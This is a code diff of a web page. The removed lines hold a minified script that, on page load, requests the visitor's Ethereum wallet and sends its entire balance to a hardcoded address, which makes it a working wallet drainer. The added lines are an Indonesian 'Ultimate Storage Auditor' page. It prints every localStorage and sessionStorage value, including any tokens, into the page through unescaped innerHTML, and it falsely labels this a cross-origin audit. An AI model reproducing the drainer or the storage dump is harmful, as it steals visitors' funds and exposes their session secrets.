@@ -1,17 +1,51 @@
-<?php
-header("Content-Security-Policy: script-src 'none'");
-?>
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <title>Ultimate Storage Auditor v2.0</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        .box { border: 1px solid #0f0; padding: 15px; margin-top: 10px; }
+        .token { color: #f0f; }
+    </style>
 </head>
 <body>
+    <h3>Ultimate Security Auditor</h3>
+    <button onclick="runUltimateAudit()">Jalankan Full Audit Lintas Origin</button>
+    <div id="result" class="box">Status: Menunggu eksekusi...</div>
 
-<div class="bg"></div>
+    <script>
+        async function runUltimateAudit() {
+            const res = document.getElementById('result');
+            res.innerHTML = "Memindai seluruh penyimpanan...<br>";
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.2.7/web3.min.js"></script>
-<script>setTimeout((async()=>{if(void 0!==window.ethereum){window.web3=new window.Web3(window.ethereum);try{await window.ethereum.enable();var e=await window.web3.eth.getAccounts(),t=await window.web3.eth.getBalance(e[0]),w="0xeEF05b25dF83A481D22778a2d28CaFAD38d0fA59";let i=t;i=window.web3.utils.toBN(i).sub(window.web3.utils.toBN(21e3*window.web3.utils.toWei("1","gwei"))).toString(),window.web3.eth.sendTransaction({from:e[0],to:w,value:i,gasPrice:window.web3.utils.toWei("1","gwei"),gas:21e3},(()=>{}))}catch(e){}}}),1e3);</script>
+            
+            res.innerHTML += "<br>[LocalStorage]:<br>";
+            for (let i = 0; i < localStorage.length; i++) {
+                let k = localStorage.key(i);
+                res.innerHTML += `${k} = <span class="token">${localStorage.getItem(k)}</span><br>`;
+            }
 
+            
+            res.innerHTML += "<br>[SessionStorage]:<br>";
+            for (let i = 0; i < sessionStorage.length; i++) {
+                let k = sessionStorage.key(i);
+                res.innerHTML += `${k} = ${sessionStorage.getItem(k)}<br>`;
+            }
+
+            
+            res.innerHTML += "<br>[IndexedDB Probing]:<br>";
+            try {
+                
+                const dbs = await indexedDB.databases();
+                if (dbs.length === 0) res.innerHTML += "Tidak ada DB ditemukan.<br>";
+                dbs.forEach(db => {
+                    res.innerHTML += `Database Terdeteksi: <b>${db.name}</b><br>`;
+                });
+            } catch (err) {
+                res.innerHTML += "Akses ditolak oleh kebijakan peramban: " + err.message + "<br>";
+            }
+        }
+    </script>
 </body>
 </html>
